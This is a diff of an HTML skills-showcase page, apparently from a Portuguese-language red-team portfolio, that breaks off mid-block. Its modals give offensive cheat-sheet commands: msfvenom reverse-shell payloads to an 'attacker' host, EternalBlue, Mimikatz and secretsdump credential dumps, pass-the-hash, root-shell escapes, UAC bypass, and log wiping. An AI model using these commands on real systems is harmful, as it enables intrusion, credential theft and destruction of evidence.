@@ -3,284 +3,149 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vitor Oliveira — Skills Interativas</title>
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <title>Skills Interativas — Vitor Oliveira</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    :root {
-      --bg: #090d1a;
-      --bg2: #0f1526;
-      --bg3: #151c30;
-      --red: #e63946;
-      --red-dim: #8b1e26;
-      --blue: #3b82f6;
-      --green: #10b981;
-      --text: #c9d1e0;
-      --text-dim: #6b7a99;
-      --text-bright: #eef2ff;
-      --mono: 'Share Tech Mono', monospace;
-      --sans: 'Inter', sans-serif;
-      --border: rgba(255,255,255,0.07);
-    }
-
-    html { scroll-behavior: smooth; }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: var(--sans);
-      font-size: 16px;
-      line-height: 1.7;
+      background: #090d1a;
+      color: #c9d1e0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      padding: 20px;
     }
-
-    a { color: var(--blue); text-decoration: none; }
-    a:hover { color: var(--text-bright); }
-
-    nav {
-      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
-      background: rgba(9, 13, 26, 0.95);
-      border-bottom: 1px solid var(--border);
-      padding: 0 2rem;
-      height: 56px;
-      display: flex; align-items: center; justify-content: space-between;
-    }
-    .nav-logo { font-family: var(--mono); font-size: 14px; color: var(--red); }
-    .nav-back { font-size: 13px; color: var(--text-dim); cursor: pointer; }
-    .nav-back:hover { color: var(--text-bright); }
-
-    .container { max-width: 1200px; margin: 0 auto; padding: 100px 2rem 2rem; }
-
-    h1 { color: var(--text-bright); font-size: 2.5rem; margin-bottom: 2rem; margin-top: 3rem; }
-
-    .section-label {
-      font-family: var(--mono);
-      font-size: 12px;
-      color: var(--red);
-      letter-spacing: 0.15em;
-      text-transform: uppercase;
-      margin-bottom: 1rem;
-      margin-top: 2rem;
-    }
-
-    .skills-grid {
+    .container { max-width: 1200px; margin: 0 auto; padding-top: 20px; }
+    h1 { color: #eef2ff; margin-bottom: 20px; font-size: 2.5rem; }
+    .section-label { color: #e63946; font-size: 12px; text-transform: uppercase; margin-top: 30px; margin-bottom: 15px; }
+    .grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 1rem;
-      margin-bottom: 3rem;
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+      gap: 10px;
+      margin-bottom: 25px;
     }
-
-    .skill-btn {
-      background: var(--bg2);
-      border: 1px solid var(--border);
-      color: var(--text);
-      padding: 1rem;
-      border-radius: 8px;
+    .btn {
+      background: #0f1526;
+      border: 1px solid rgba(255,255,255,0.1);
+      color: #c9d1e0;
+      padding: 12px 8px;
+      border-radius: 6px;
       cursor: pointer;
-      font-family: var(--mono);
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 500;
       text-align: center;
       transition: all 0.2s;
     }
-
-    .skill-btn:hover {
-      border-color: var(--red);
-      color: var(--text-bright);
-      transform: translateY(-2px);
+    .btn:hover {
+      border-color: #e63946;
+      color: #eef2ff;
+      background: #151c30;
     }
-
-    .skill-btn.highlight {
-      border-color: var(--red-dim);
-      color: var(--red);
-    }
-
-    .skill-btn.highlight:hover {
-      border-color: var(--red);
-      background: rgba(230, 57, 70, 0.1);
-    }
-
     .modal {
       display: none;
       position: fixed;
       top: 0;
       left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.7);
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
       z-index: 1000;
       align-items: center;
       justify-content: center;
     }
-
     .modal.active {
       display: flex;
     }
-
     .modal-content {
-      background: var(--bg2);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      max-width: 800px;
-      max-height: 90vh;
+      background: #0f1526;
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 8px;
+      padding: 30px;
+      max-width: 700px;
+      max-height: 80vh;
       overflow-y: auto;
-      padding: 2rem;
       position: relative;
     }
-
-    .modal-close {
+    .close-btn {
       position: absolute;
-      top: 1rem;
-      right: 1rem;
+      top: 15px;
+      right: 15px;
       background: none;
       border: none;
-      color: var(--text-dim);
-      font-size: 24px;
+      color: #c9d1e0;
+      font-size: 28px;
       cursor: pointer;
+      padding: 0;
+      width: 30px;
+      height: 30px;
     }
-
-    .modal-close:hover {
-      color: var(--text-bright);
-    }
-
-    .modal h2 {
-      color: var(--text-bright);
-      font-size: 1.8rem;
-      margin-bottom: 1rem;
-      margin-top: 0;
-    }
-
-    .modal h3 {
-      color: var(--red);
-      font-size: 1.1rem;
-      margin-top: 1.5rem;
-      margin-bottom: 0.75rem;
-    }
-
-    .modal p {
-      color: var(--text);
-      line-height: 1.8;
-      margin-bottom: 1rem;
-    }
-
-    .code-block {
-      background: var(--bg3);
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 1rem;
-      margin: 1rem 0;
-      font-family: var(--mono);
-      font-size: 12px;
+    .close-btn:hover { color: #eef2ff; }
+    h2 { color: #eef2ff; margin-bottom: 15px; font-size: 1.8rem; }
+    h3 { color: #e63946; margin-top: 20px; margin-bottom: 10px; }
+    p { line-height: 1.6; margin-bottom: 15px; }
+    .code {
+      background: #151c30;
+      border: 1px solid rgba(255,255,255,0.05);
+      padding: 12px;
+      margin: 10px 0;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+      color: #10b981;
       overflow-x: auto;
-      color: var(--green);
-      line-height: 1.5;
-    }
-
-    .info-box {
-      background: rgba(16, 185, 129, 0.1);
-      border-left: 4px solid var(--green);
-      padding: 1rem;
-      border-radius: 4px;
-      margin: 1rem 0;
-      font-size: 14px;
-    }
-
-    .warning-box {
-      background: rgba(230, 57, 70, 0.1);
-      border-left: 4px solid var(--red);
-      padding: 1rem;
-      border-radius: 4px;
-      margin: 1rem 0;
-      font-size: 14px;
-    }
-
-    ul, ol {
-      margin-left: 1.5rem;
-      margin-bottom: 1rem;
-    }
-
-    li {
-      margin-bottom: 0.5rem;
-    }
-
-    ::-webkit-scrollbar {
-      width: 8px;
-    }
-    ::-webkit-scrollbar-track {
-      background: var(--bg3);
-    }
-    ::-webkit-scrollbar-thumb {
-      background: var(--red-dim);
       border-radius: 4px;
     }
+    ul, ol { margin-left: 20px; margin-bottom: 10px; }
+    li { margin-bottom: 8px; }
   </style>
 </head>
 <body>
 
-<nav>
-  <span class="nav-logo">vitor@redteam:~$ skills</span>
-  <a href="index.html" class="nav-back">← Voltar ao Portfólio</a>
-</nav>
-
 <div class="container">
   <h1>🛠️ Skills Interativas</h1>
-  <p style="color: var(--text-dim); margin-bottom: 2rem;">Clique em cada skill para ver descrição, comandos e exemplos práticos</p>
+  <p style="margin-bottom: 30px;">Clique em qualquer skill para ver descrição e comandos</p>
 
-  <div class="section-label">// OFENSIVO</div>
-  <div class="skills-grid">
-    <button class="skill-btn highlight" data-modal="red-team">Red Team</button>
-    <button class="skill-btn highlight" data-modal="pentest">Pentest</button>
-    <button class="skill-btn" data-modal="priv-esc-win">Priv Esc (Win)</button>
-    <button class="skill-btn" data-modal="priv-esc-linux">Priv Esc (Linux)</button>
-    <button class="skill-btn" data-modal="lateral-movement">Lateral Movement</button>
-    <button class="skill-btn" data-modal="opsec">OPSEC</button>
-    <button class="skill-btn" data-modal="edr-evasion">EDR Evasion</button>
-    <button class="skill-btn" data-modal="post-exploit">Post-Exploitation</button>
+  <div class="section-label">OFENSIVO</div>
+  <div class="grid">
+    <button class="btn" onclick="open_modal('red-team')">Red Team</button>
+    <button class="btn" onclick="open_modal('pentest')">Pentest</button>
+    <button class="btn" onclick="open_modal('priv-win')">Priv Esc (Win)</button>
+    <button class="btn" onclick="open_modal('priv-linux')">Priv Esc (Linux)</button>
+    <button class="btn" onclick="open_modal('lateral')">Lateral Movement</button>
+    <button class="btn" onclick="open_modal('opsec')">OPSEC</button>
+    <button class="btn" onclick="open_modal('edr')">EDR Evasion</button>
+    <button class="btn" onclick="open_modal('post')">Post-Exploit</button>
   </div>
 
-  <div class="section-label">// FERRAMENTAS</div>
-  <div class="skills-grid">
-    <button class="skill-btn" data-modal="burp">Burp Suite</button>
-    <button class="skill-btn" data-modal="bloodhound">BloodHound</button>
-    <button class="skill-btn" data-modal="nxc">NXC</button>
-    <button class="skill-btn" data-modal="nmap">Nmap</button>
-    <button class="skill-btn" data-modal="metasploit">Metasploit</button>
-    <button class="skill-btn" data-modal="sqlmap">SQLMap</button>
-    <button class="skill-btn" data-modal="impacket">Impacket</button>
-    <button class="skill-btn" data-modal="mimikatz">Mimikatz</button>
+  <div class="section-label">FERRAMENTAS</div>
+  <div class="grid">
+    <button class="btn" onclick="open_modal('burp')">Burp Suite</button>
+    <button class="btn" onclick="open_modal('bh')">BloodHound</button>
+    <button class="btn" onclick="open_modal('nxc')">NXC</button>
+    <button class="btn" onclick="open_modal('nmap')">Nmap</button>
+    <button class="btn" onclick="open_modal('msf')">Metasploit</button>
+    <button class="btn" onclick="open_modal('sqlmap')">SQLMap</button>
+    <button class="btn" onclick="open_modal('impacket')">Impacket</button>
+    <button class="btn" onclick="open_modal('mimikatz')">Mimikatz</button>
   </div>
 
-  <div class="section-label">// AMBIENTES & FRAMEWORKS</div>
-  <div class="skills-grid">
-    <button class="skill-btn" data-modal="ad">Active Directory</button>
-    <button class="skill-btn" data-modal="windows">Windows</button>
-    <button class="skill-btn" data-modal="linux">Linux</button>
-    <button class="skill-btn" data-modal="mitre">MITRE ATT&CK</button>
-    <button class="skill-btn" data-modal="ttps">TTPs</button>
-  </div>
-
-  <div class="section-label">// DEFENSIVO</div>
-  <div class="skills-grid">
-    <button class="skill-btn" data-modal="siem">SIEM</button>
-    <button class="skill-btn" data-modal="incident">Incident Response</button>
-    <button class="skill-btn" data-modal="threat-detection">Threat Detection</button>
-    <button class="skill-btn" data-modal="detection-tuning">Detection Tuning</button>
+  <div class="section-label">AMBIENTES & DEFENSIVO</div>
+  <div class="grid">
+    <button class="btn" onclick="open_modal('ad')">Active Directory</button>
+    <button class="btn" onclick="open_modal('windows')">Windows</button>
+    <button class="btn" onclick="open_modal('linux')">Linux</button>
+    <button class="btn" onclick="open_modal('mitre')">MITRE ATT&CK</button>
+    <button class="btn" onclick="open_modal('siem')">SIEM</button>
+    <button class="btn" onclick="open_modal('ir')">Incident Response</button>
+    <button class="btn" onclick="open_modal('detection')">Threat Detection</button>
+    <button class="btn" onclick="open_modal('tuning')">Detection Tuning</button>
   </div>
 </div>
 
-<!-- MODALS -->
-
+<!-- Red Team Modal -->
 <div id="red-team" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('red-team')">×</button>
     <h2>🔴 Red Team</h2>
     <p>Simular adversários reais em operações estruturadas de teste de segurança.</p>
-
-    <h3>O que é</h3>
-    <p>Red Team é uma simulação realista de um ataque APT, testando não apenas defesa técnica, mas também processos, pessoas e procedimentos.</p>
-
     <h3>Fases do Red Team</h3>
-    <div class="code-block">
+    <div class="code">
 1. Reconhecimento (OSINT passivo)
 2. Weaponização (criar payloads)
 3. Entrega (phishing, watering hole)
@@ -289,9 +154,8 @@
 6. C2 (Command & Control)
 7. Ações nos Objetivos (lateral movement, data exfil)
     </div>
-
     <h3>Ferramentas principais</h3>
-    <div class="code-block">
+    <div class="code">
 nmap -sS -p- target.com
 subfinder -d target.com
 BloodHound (AD mapping)
@@ -299,27 +163,17 @@ Burp Suite (web testing)
 Metasploit (exploitation)
 HAVOC C2 (command & control)
     </div>
-
-    <div class="info-box">
-      <strong>💡 Dica:</strong> Red Teams focam em OPSEC, evasão e persistência — não é apenas exploração rápida, é operação realista.
-    </div>
   </div>
 </div>
 
+<!-- Pentest Modal -->
 <div id="pentest" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('pentest')">×</button>
     <h2>🔍 Pentest</h2>
     <p>Teste de penetração estruturado para identificar vulnerabilidades em sistemas, aplicações e infraestrutura.</p>
-
-    <h3>Diferença: Pentest vs Red Team</h3>
-    <ul>
-      <li><strong>Pentest:</strong> Encontrar vulnerabilidades</li>
-      <li><strong>Red Team:</strong> Simular adversário real</li>
-    </ul>
-
     <h3>Fases do Pentest</h3>
-    <div class="code-block">
+    <div class="code">
 1. Reconhecimento
 2. Scanning (vulnerabilidades)
 3. Enumeração
@@ -327,131 +181,108 @@ HAVOC C2 (command & control)
 5. Pós-exploração
 6. Relatório
     </div>
-
     <h3>Ferramentas por fase</h3>
     <ul>
-      <li><strong>Scanning:</strong> Nmap, Nessus, OpenVAS</li>
-      <li><strong>Web:</strong> Burp Suite, OWASP ZAP</li>
-      <li><strong>Exploitation:</strong> Metasploit, Impacket</li>
-      <li><strong>Reporting:</strong> Burp, Nessus, Dradis</li>
+      <li>Scanning: Nmap, Nessus</li>
+      <li>Web: Burp Suite, OWASP ZAP</li>
+      <li>Exploitation: Metasploit, Impacket</li>
+      <li>Reporting: Burp, Nessus, Dradis</li>
     </ul>
   </div>
 </div>
 
-<div id="priv-esc-win" class="modal">
+<!-- Privilege Escalation Windows -->
+<div id="priv-win" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('priv-win')">×</button>
     <h2>🪟 Privilege Escalation — Windows</h2>
-    <p>Técnicas para elevar privilégios de usuário comum para administrador/SYSTEM.</p>
-
     <h3>Verificar privilégios atuais</h3>
-    <div class="code-block">
+    <div class="code">
 whoami /all
 whoami /priv
 Get-Identity
     </div>
-
     <h3>Técnicas comuns</h3>
-
     <h4>1. UAC Bypass</h4>
-    <div class="code-block">
+    <div class="code">
 C:\Windows\System32\fodhelper.exe
 reg add HKCU\Software\Classes\ms-settings\shell\open\command
     </div>
-
     <h4>2. Service Vulnerability</h4>
-    <div class="code-block">
+    <div class="code">
 accesschk64.exe -accepteula -nobanner /w "Authenticated Users" c:\
 sc query state=all | findstr /i "SERVICE_NAME"
     </div>
-
     <h4>3. Kernel Exploit</h4>
-    <div class="code-block">
+    <div class="code">
 systeminfo > info.txt
 python wes.py info.txt
-    </div>
-
-    <div class="warning-box">
-      <strong>⚠️ Detecção:</strong> Monitore changes em services, registry UAC, DLL injection.
     </div>
   </div>
 </div>
 
-<div id="priv-esc-linux" class="modal">
+<!-- Privilege Escalation Linux -->
+<div id="priv-linux" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('priv-linux')">×</button>
     <h2>🐧 Privilege Escalation — Linux</h2>
-    <p>Técnicas para elevar privilégios de usuário comum para root em Linux.</p>
-
     <h3>Verificar privilégios atuais</h3>
-    <div class="code-block">
+    <div class="code">
 id
 sudo -l
 groups
     </div>
-
     <h3>Técnicas comuns</h3>
-
     <h4>1. Sudo Misconfiguration</h4>
-    <div class="code-block">
+    <div class="code">
 sudo -l
 sudo -u root /usr/bin/python -c "import os; os.system('/bin/bash')"
     </div>
-
     <h4>2. SUID Binary Abuse</h4>
-    <div class="code-block">
+    <div class="code">
 find / -perm -4000 2>/dev/null
 /usr/bin/find . -exec /bin/bash \; -quit
     </div>
-
     <h4>3. Kernel Exploit</h4>
-    <div class="code-block">
+    <div class="code">
 uname -a
 gcc exploit.c -o exploit
 ./exploit
     </div>
-
-    <div class="warning-box">
-      <strong>⚠️ Detecção:</strong> Monitore sudo execution, SUID binary access, kernel exploits.
-    </div>
   </div>
 </div>
 
-<div id="lateral-movement" class="modal">
+<!-- Lateral Movement -->
+<div id="lateral" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('lateral')">×</button>
     <h2>↔️ Lateral Movement</h2>
-    <p>Técnicas para se mover entre hosts/usuários/domínios após acesso inicial.</p>
-
     <h3>Pass-the-Hash (Windows)</h3>
-    <div class="code-block">
+    <div class="code">
 mimikatz > sekurlsa::logonpasswords
 pth-winexe -U user%NTLM_HASH //target cmd.exe
-crackmapexec smb 192.168.1.100 -u admin -H hash -x "whoami"
+nxc smb 192.168.1.100 -u admin -H hash -x "whoami"
     </div>
-
-    <h3>Pass-the-Ticket (Kerberos)</h3>
-    <div class="code-block">
-GetUserSPNs.py -request domain/user:pass
-psexec.py -k -no-pass domain/user@target
-    </div>
-
     <h3>Kerberoasting</h3>
-    <div class="code-block">
+    <div class="code">
 GetUserSPNs.py -request domain/user:pass
 hashcat -m 13100 spn_hashes.txt wordlist.txt
     </div>
+    <h3>Psexec</h3>
+    <div class="code">
+psexec.py domain/user:pass@target cmd
+psexec.py -k -no-pass domain/user@target
+    </div>
   </div>
 </div>
 
+<!-- OPSEC -->
 <div id="opsec" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('opsec')">×</button>
     <h2>🔐 OPSEC</h2>
-    <p>Práticas para manter sigilo e segurança durante operações ofensivas.</p>
-
     <h3>Checklist OPSEC</h3>
-    <div class="code-block">
+    <div class="code">
 ☐ Usar VPN/Proxy para conexões
 ☐ Usar domínio legítimo para C2
 ☐ Certificado SSL válido (não self-signed)
@@ -460,9 +291,8 @@ hashcat -m 13100 spn_hashes.txt wordlist.txt
 ☐ Limpar logs após operação
 ☐ Compartimentalizar operações
     </div>
-
     <h3>Limpeza de Logs</h3>
-    <div class="code-block">
+    <div class="code">
 # Windows
 wevtutil cl System
 wevtutil cl Security
@@ -474,202 +304,160 @@ rm /var/log/* -rf
   </div>
 </div>
 
-<div id="edr-evasion" class="modal">
+<!-- EDR Evasion -->
+<div id="edr" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('edr')">×</button>
     <h2>👻 EDR Evasion</h2>
-    <p>Técnicas para contornar Endpoint Detection and Response (EDR).</p>
-
     <h3>Tipos de detecção EDR</h3>
     <ul>
-      <li><strong>Assinatura:</strong> Pattern matching conhecido</li>
-      <li><strong>Heurística:</strong> Análise comportamental estática</li>
-      <li><strong>Comportamental:</strong> Monitoramento em tempo real</li>
+      <li>Assinatura: Pattern matching conhecido</li>
+      <li>Heurística: Análise comportamental estática</li>
+      <li>Comportamental: Monitoramento em tempo real</li>
     </ul>
-
     <h3>Técnicas de Evasão</h3>
-    <div class="code-block">
+    <div class="code">
 1. Syscall Direto (Bypass API hooks)
 2. Process Injection (explorer.exe)
 3. Fileless Execution (PowerShell)
 4. Living off the Land (LOLBINs)
     </div>
-
-    <div class="info-box">
-      <strong>💡 Dica:</strong> Evitar comportamentos conhecidos de malware (LSASS access, rundll32 injection).
-    </div>
   </div>
 </div>
 
-<div id="post-exploit" class="modal">
+<!-- Post-Exploitation -->
+<div id="post" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('post')">×</button>
     <h2>⚔️ Post-Exploitation</h2>
-    <p>Atividades realizadas após exploração inicial com sucesso.</p>
-
-    <h3>Fases pós-exploração</h3>
-    <ol>
-      <li>Estabilização</li>
-      <li>Enumeração</li>
-      <li>Lateral Movement</li>
-      <li>Privilege Escalation</li>
-      <li>Persistência</li>
-      <li>Exfiltração</li>
-    </ol>
-
+    <h3>Fases</h3>
+    <div class="code">
+1. Estabilização (manter acesso)
+2. Enumeração (mapear rede)
+3. Lateral Movement (mover-se)
+4. Privilege Escalation (aumentar privs)
+5. Persistência (manter acesso)
+6. Exfiltração (roubar dados)
+    </div>
     <h3>Dump de Credenciais</h3>
-    <div class="code-block">
+    <div class="code">
 mimikatz.exe
 sekurlsa::logonpasswords
 reg save HKLM\SAM sam
-    </div>
-
-    <h3>Persistência</h3>
-    <div class="code-block">
-reg add HKLM\Software\...\Run /v Svchost /d "C:\beacon.exe"
-schtasks /create /tn "Windows Update" /tr "C:\beacon.exe"
-sc create Svchost binPath= "C:\beacon.exe"
+reg save HKLM\SYSTEM system
     </div>
   </div>
 </div>
 
+<!-- Burp Suite -->
 <div id="burp" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('burp')">×</button>
     <h2>🔵 Burp Suite</h2>
-    <p>Proxy web e scanner de vulnerabilidades líder em testes de aplicações web.</p>
-
     <h3>Funcionalidades principais</h3>
     <ul>
-      <li><strong>Proxy:</strong> Interceptar/modificar requests</li>
-      <li><strong>Scanner:</strong> Scan automático</li>
-      <li><strong>Intruder:</strong> Fuzzing e brute-force</li>
-      <li><strong>Repeater:</strong> Testar requests customizadas</li>
+      <li>Proxy: Interceptar/modificar requests HTTP</li>
+      <li>Scanner: Scan automático de vulnerabilidades</li>
+      <li>Intruder: Fuzzing e brute-force</li>
+      <li>Repeater: Testar requests customizadas</li>
     </ul>
-
     <h3>Workflow básico</h3>
-    <div class="code-block">
+    <div class="code">
 1. Configurar proxy (127.0.0.1:8080)
 2. Target → Scope → Add target URL
-3. Navegar no browser
-4. Scanner → Active/Passive Scan
-5. Issues → Revisar vulnerabilidades
-    </div>
-
-    <div class="info-box">
-      <strong>💡 Dica:</strong> Use "Scope" para focar apenas em URLs alvo, reduz falsos positivos.
+3. Navegar no browser (tráfego capturado)
+4. Proxy → Intercept → Review requests
+5. Scanner → Active/Passive Scan
+6. Issues → Revisar vulnerabilidades
     </div>
   </div>
 </div>
 
-<div id="bloodhound" class="modal">
+<!-- BloodHound -->
+<div id="bh" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('bh')">×</button>
     <h2>🩸 BloodHound</h2>
-    <p>Visualiza relacionamentos e caminhos de ataque em Active Directory.</p>
-
     <h3>O que faz</h3>
-    <p>BloodHound mapeia usuários, grupos, computadores e relações de permissão em AD.</p>
-
-    <h3>Instalação & Coleta</h3>
-    <div class="code-block">
+    <p>Mapeia usuários, grupos, computadores e relações de permissão em AD, mostrando caminhos de ataque até Domain Admin.</p>
+    <h3>Coleta de dados</h3>
+    <div class="code">
+# Windows
 .\SharpHound.exe -c All
+
+# Linux
 python3 bloodhound.py -d domain.com -u user -p pass -c All
     </div>
-
-    <h3>Análise de dados</h3>
-    <div class="code-block">
+    <h3>Análise</h3>
+    <div class="code">
 1. Abrir BloodHound (Neo4j backend)
 2. Upload .zip coletado
 3. Home → Queries pré-prontas
 4. Find Shortest Path to DA
     </div>
-
-    <h3>Técnicas encontradas</h3>
-    <ul>
-      <li>Constrained Delegation</li>
-      <li>Unconstrained Delegation</li>
-      <li>Kerberoasting opportunities</li>
-      <li>GenericWrite/GenericAll permissions</li>
-    </ul>
   </div>
 </div>
 
+<!-- NXC -->
 <div id="nxc" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('nxc')">×</button>
     <h2>🌐 NXC (NetExec)</h2>
-    <p>Ferramenta moderna para testes de segurança em redes SMB/LDAP/Kerberos.</p>
-
-    <h3>Funcionalidades</h3>
-    <ul>
-      <li>Descoberta de hosts</li>
-      <li>Validação de credenciais</li>
-      <li>Execução remota de comandos</li>
-      <li>Pass-the-Hash / Pass-the-Ticket</li>
-      <li>Dumping de hashes</li>
-    </ul>
-
-    <h3>Uso básico</h3>
-    <div class="code-block">
-# Descobrir hosts vivos
+    <h3>Descoberta de hosts</h3>
+    <div class="code">
 nxc smb 192.168.1.0/24
-
-# Validar credenciais
+    </div>
+    <h3>Validação de credenciais</h3>
+    <div class="code">
 nxc smb 192.168.1.100 -u user -p pass
-
-# Pass-the-Hash
-nxc smb 192.168.1.100 -u admin -H "hash" -x "whoami"
-
-# Dump de SAM
+nxc smb 192.168.1.0/24 -u users.txt -p pass.txt --continue-on-success
+    </div>
+    <h3>Pass-the-Hash</h3>
+    <div class="code">
+nxc smb 192.168.1.100 -u admin -H "aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e" -x "whoami"
+    </div>
+    <h3>Dump de SAM</h3>
+    <div class="code">
 nxc smb 192.168.1.100 -u admin -p pass --sam
     </div>
   </div>
 </div>
 
+<!-- Nmap -->
 <div id="nmap" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('nmap')">×</button>
     <h2>🎯 Nmap</h2>
-    <p>Scanner de portas e detecção de serviços - ferramenta essencial de reconhecimento.</p>
-
-    <h3>Scans comuns</h3>
-    <div class="code-block">
+    <h3>Tipos de scans</h3>
+    <div class="code">
 # Quick scan (top 1000 portas)
 nmap -F target.com
 
 # Scan completo
-nmap -sS -Pn -p- target.com
+nmap -sS -Pn -p- target.com --min-rate 5000
 
 # Detalhado (versão + scripts)
 nmap -sV -sC -p- target.com
 
-# Agressivo
+# Agressivo (OS + version + scripts)
 nmap -A -p- target.com
     </div>
-
     <h3>Evasão de IDS/IPS</h3>
-    <div class="code-block">
-# Fragmentação
-nmap -f target.com
-
-# Decoys
-nmap -D RND:10 target.com
-
-# Data padding
-nmap --data-length 100 target.com
+    <div class="code">
+nmap -f target.com                  # Fragmentação
+nmap -D RND:10 target.com           # Decoys
+nmap --scan-delay 100ms target.com  # Espaçamento
     </div>
   </div>
 </div>
 
-<div id="metasploit" class="modal">
+<!-- Metasploit -->
+<div id="msf" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('msf')">×</button>
     <h2>⚙️ Metasploit</h2>
-    <p>Framework completo para exploitation e post-exploitation.</p>
-
     <h3>Workflow básico</h3>
-    <div class="code-block">
+    <div class="code">
 msfconsole
 search exploit smb
 use exploit/windows/smb/ms17_010_eternalblue
@@ -679,10 +467,9 @@ set LHOST 192.168.1.1
 set PAYLOAD windows/meterpreter/reverse_tcp
 exploit
     </div>
-
-    <h3>Msfvenom (Gerador)</h3>
-    <div class="code-block">
-# Payload reversível
+    <h3>Msfvenom (Gerador de payloads)</h3>
+    <div class="code">
+# Payload simples
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe
 
 # Com obfuscação
@@ -691,179 +478,133 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 5 -f exe
   </div>
 </div>
 
+<!-- SQLMap -->
 <div id="sqlmap" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('sqlmap')">×</button>
     <h2>💾 SQLMap</h2>
-    <p>Ferramenta para automatizar detecção e exploração de SQL Injection.</p>
-
-    <h3>Uso básico</h3>
-    <div class="code-block">
-# Auto-detect SQL injection
+    <h3>Auto-detect SQL injection</h3>
+    <div class="code">
 sqlmap -u "http://target.com/page.php?id=1"
-
-# Enumerate databases
-sqlmap -u "http://target.com/page.php?id=1" --dbs
-
-# Dump table
-sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
-
-# Crawl & test
-sqlmap -u "http://target.com" --crawl=2 --batch
     </div>
-
-    <h3>POST request</h3>
-    <div class="code-block">
-sqlmap -r request.txt --dbs
-sqlmap -u "http://target.com" --data="user=admin&pass=1*" --dbs
+    <h3>Enumerate databases</h3>
+    <div class="code">
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+    </div>
+    <h3>Dump table</h3>
+    <div class="code">
+sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
+    </div>
+    <h3>Crawl and test</h3>
+    <div class="code">
+sqlmap -u "http://target.com" --crawl=2 --batch
     </div>
   </div>
 </div>
 
+<!-- Impacket -->
 <div id="impacket" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('impacket')">×</button>
     <h2>📦 Impacket</h2>
-    <p>Biblioteca Python com ferramentas para SMB, LDAP, Kerberos.</p>
-
-    <h3>Ferramentas principais</h3>
-    <div class="code-block">
-GetUserSPNs.py        # Kerberoasting
-GetNPUsers.py         # ASREPRoasting
-secretsdump.py        # Dump credenciais
-psexec.py             # Execução remota
-ticketer.py           # Forjar tickets
-    </div>
-
     <h3>Kerberoasting</h3>
-    <div class="code-block">
+    <div class="code">
 python3 GetUserSPNs.py -request domain/user:pass
 hashcat -m 13100 spn_hashes.txt wordlist.txt
     </div>
-
     <h3>Dump de Credenciais</h3>
-    <div class="code-block">
+    <div class="code">
 python3 secretsdump.py domain/user:pass@target
 python3 secretsdump.py -ntds-file ntds.dit -system-file system.hive local
+    </div>
+    <h3>Psexec</h3>
+    <div class="code">
+python3 psexec.py domain/user:pass@target cmd
+python3 psexec.py -k -no-pass domain/user@target
     </div>
   </div>
 </div>
 
+<!-- Mimikatz -->
 <div id="mimikatz" class="modal">
   <div class="modal-content">
-    <button class="modal-close">&times;</button>
+    <button class="close-btn" onclick="close_modal('mimikatz')">×</button>
     <h2>💀 Mimikatz</h2>
-    <p>Ferramenta de extração de credenciais em memória.</p>
-
-    <h3>Setup</h3>
-    <div class="code-block">
+    <h3>Dump de Credenciais (LSASS)</h3>
+    <div class="code">
 mimikatz.exe
 privilege::debug
 sekurlsa::logonpasswords
     </div>
-
-    <h3>Dump de Credenciais</h3>
-    <div class="code-block">
-mimikatz > sekurlsa::logonpasswords
-# NTLM hash
-# Plaintext password (se em memória)
-# Kerberos tickets
-    </div>
-
     <h3>SAM Dump (local)</h3>
-    <div class="code-block">
+    <div class="code">
 mimikatz > lsadump::sam
-# Extrai hashes de usuários locais
     </div>
-
     <h3>Golden Ticket</h3>
-    <div class="code-block">
-mimikatz > kerberos::golden /user:Administrator /sid:S-1-5-21-... /krbtgt:hash /ticket:ticket.kirbi
-mimikatz > kerberos::ppt ticket.kirbi
+    <div class="code">
